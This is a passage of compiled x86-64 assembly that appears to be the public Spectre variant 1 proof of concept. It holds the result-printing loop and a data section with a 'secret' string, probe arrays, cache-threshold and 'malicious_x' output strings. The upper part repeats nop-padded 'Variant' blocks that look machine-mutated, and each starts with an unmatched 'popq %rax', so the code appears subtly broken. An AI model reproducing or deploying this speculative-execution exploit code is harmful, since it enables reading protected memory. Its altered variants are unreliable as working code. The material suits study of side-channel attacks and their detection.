## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 145
.Lmain_win0_var145:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win0_continue
## Variant 146
.Lmain_win0_var146:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 147
.Lmain_win0_var147:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 148
.Lmain_win0_var148:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 149
.Lmain_win0_var149:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win0_continue
.Lmain_win0_continue:
	movl	%eax, -76(%rbp)    # # 4-byte Spill
	jmp	LBB2_19
LBB2_18:                                ##   in Loop: Header=BB2_9 Depth=1
	movl	$63, %eax
	movl	%eax, -76(%rbp)    # # 4-byte Spill
	jmp	LBB2_19
LBB2_19:                                ##   in Loop: Header=BB2_9 Depth=1
	movl	-72(%rbp), %esi    # # 4-byte Reload
	movl	-76(%rbp), %edx    # # 4-byte Reload
	movl	-12(%rbp), %ecx
	leaq	L_.str.17(%rip), %rdi
	movb	$0, %al
	callq	_printf
LBB2_20:                                ##   in Loop: Header=BB2_9 Depth=1
	leaq	L_.str.10(%rip), %rdi
	movb	$0, %al
	callq	_printf
	jmp	LBB2_9
LBB2_21:
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB2_23
## %bb.22:
	xorl	%eax, %eax
	addq	$80, %rsp
	popq	%rbp
	retq
LBB2_23:
	callq	___stack_chk_fail
	.cfi_endproc
                                        ## -- End function
	.section	__DATA,__data
	.globl	_array1_size                    ## @array1_size
	.p2align	2, 0x0
_array1_size:
	.long	16                              ## 0x10
	.globl	_array1                         ## @array1
	.p2align	4, 0x0
_array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.section	__TEXT,__cstring,cstring_literals
	L_.str	:    # # @.str
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.section	__DATA,__data
	.globl	_secret                         ## @secret
	.p2align	3, 0x0
_secret:
	.quad	L_.str
	.globl	_temp                           ## @temp
.zerofill __DATA,__common,_temp,1,0
	.comm	_array2,131072,4                ## @array2
.zerofill __DATA,__bss,_readMemoryByte.results,1024,4 ## @readMemoryByte.results
	.section	__TEXT,__cstring,cstring_literals
	L_.str.1	:    # # @.str.1
	.asciz	"%d"
	L_.str.2	:    # # @.str.2
	.asciz	"%p"
	L_.str.3	:    # # @.str.3
	.asciz	"Using a cache hit threshold of %d.\n"
	L_.str.4	:    # # @.str.4
	.asciz	"Build: "
	L_.str.5	:    # # @.str.5
	.asciz	"RDTSCP_SUPPORTED "
	L_.str.6	:    # # @.str.6
	.asciz	"MFENCE_SUPPORTED "
	L_.str.7	:    # # @.str.7
	.asciz	"CLFLUSH_SUPPORTED "
	L_.str.8	:    # # @.str.8
	.asciz	"INTEL_MITIGATION_DISABLED "
	L_.str.9	:    # # @.str.9
	.asciz	"LINUX_KERNEL_MITIGATION_DISABLED "
	L_.str.10	:    # # @.str.10
	.asciz	"\n"
	L_.str.11	:    # # @.str.11
	.asciz	"Reading %d bytes:\n"
	L_.str.12	:    # # @.str.12
	.asciz	"Reading at malicious_x = %p... "
	L_.str.13	:    # # @.str.13
	.asciz	"%s: "
	L_.str.14	:    # # @.str.14
	.asciz	"Success"
	L_.str.15	:    # # @.str.15
	.asciz	"Unclear"
	L_.str.16	:    # # @.str.16
	.asciz	"0x%02X=\342\200\231%c\342\200\231 score=%d "
	L_.str.17	:    # # @.str.17
	.asciz	"(second best: 0x%02X=\342\200\231%c\342\200\231 score=%d)"
	.comm	_unused1,64,4                   ## @unused1
	.comm	_unused2,64,4                   ## @unused2
.subsections_via_symbols
